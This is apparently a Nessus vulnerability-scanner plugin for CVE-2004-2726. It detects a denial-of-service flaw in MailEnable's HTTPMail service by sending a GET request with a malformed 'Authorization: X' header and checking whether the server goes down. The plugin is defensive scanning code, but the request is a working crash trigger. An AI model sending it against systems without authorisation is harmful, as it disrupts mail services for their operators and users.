#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#


include("compat.inc");

if (description)
{
  script_id(14654);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2016/10/03 20:33:39 $");

  script_cve_id("CVE-2004-2726");
  script_osvdb_id(6038);

  script_name(english:"MailEnable HTTPMail Service Authorization Header Handling Remote DoS");
  script_summary(english:"Checks for authorization header DoS vulnerability in MailEnable HTTPMail service");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service flaw." );
  script_set_attribute(attribute:"description", value:
"The remote host is running an instance of MailEnable that has a flaw
in the HTTPMail service (MEHTTPS.exe) in the Professional and
Enterprise Editions.  The flaw can be exploited by issuing an HTTP
request with a malformed Authorization header, which causes a NULL
pointer dereference error and crashes the HTTPMail service." );
  script_set_attribute(attribute:"see_also", value:"http://www.oliverkarow.de/research/MailWebHTTPAuthCrash.txt" );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2004/May/172" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to MailEnable Professional / Enterprise 1.19 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_attribute(attribute:"plugin_publication_date", value: "2004/09/03");
  script_set_attribute(attribute:"patch_publication_date", value: "2004/05/16");
  script_set_attribute(attribute:"vuln_publication_date", value: "2004/05/11");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mailenable:mailenable");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004-2016 George A. Theall");

  script_family(english:"CGI abuses");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8080);
if (http_is_dead(port:port)) exit(0);


# Make sure banner's from MailEnable.
banner = get_http_banner(port:port);
if (banner && egrep(pattern:"^Server: .*MailEnable", string:banner)) {
  # Try to bring it down.
  req = string(
    "GET / HTTP/1.0\r\n",
    "Authorization: X\r\n",
    "\r\n"
  );
  debug_print("req='", req, "'.\n");
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  debug_print("res='", res, "'.\n");

  # There's a problem if the web server is down.
  if (isnull(res)) {
    if (http_is_dead(port:port)) security_warning(port);
  }
}
